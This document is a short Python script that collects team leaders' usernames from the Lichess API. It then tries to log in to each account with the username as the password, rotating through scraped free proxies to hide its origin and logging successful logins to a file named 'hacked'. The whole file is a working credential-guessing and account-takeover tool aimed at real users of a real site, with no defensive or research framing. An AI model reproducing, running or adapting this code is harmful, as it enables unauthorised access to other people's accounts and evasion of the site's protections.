import requests, time, json

def s2(user, password):
    r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=2000&country=all&ssl=all&anonymity=all")
    proxy_list = r.text.split("\r\n")
    for p in proxy_list:
        proxies = {"http" : "http://" + p, "https" : "http://" + p}
        try:
          n = requests.post("https://lichess.org/login", data = {"username" : user, "password" : password}, headers={"X-Requested-With" : "XMLHttpRequest", "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"}, proxies=proxies, timeout=2)
          return n
        except: time.sleep(0.2)
    return 0


def getNumericPart(string):
    res = ''
    for i in string:
        if (i.isnumeric()): res = res + i
    return res

def analyze(team):
    global k, leader_list
    team = json.loads(requests.get("https://lichess.org/api/team/"+team).text)
    usernames = team.get("leaders")
    if (not usernames): return
    for username in usernames:
        username = username.get("name")
        if (username in leader_list): continue
        leader_list.append(username)
        if (username == 'Urtas'): k = 1
        if (not k): continue
        passwords = [username]
        for password in passwords:
            if (not password): continue
            if (len(password) < 4): continue
            r = s2(username, password)
            print(r.status_code, username, password)
            if (r.status_code == 200): open("hacked", "a").write(username + " " + password + "\n")
            time.sleep(5)


leader_list = []
k = 1
for team in open("team_list").read().split("\n"):
     analyze(team)
     open("stateam", "w").write(team)
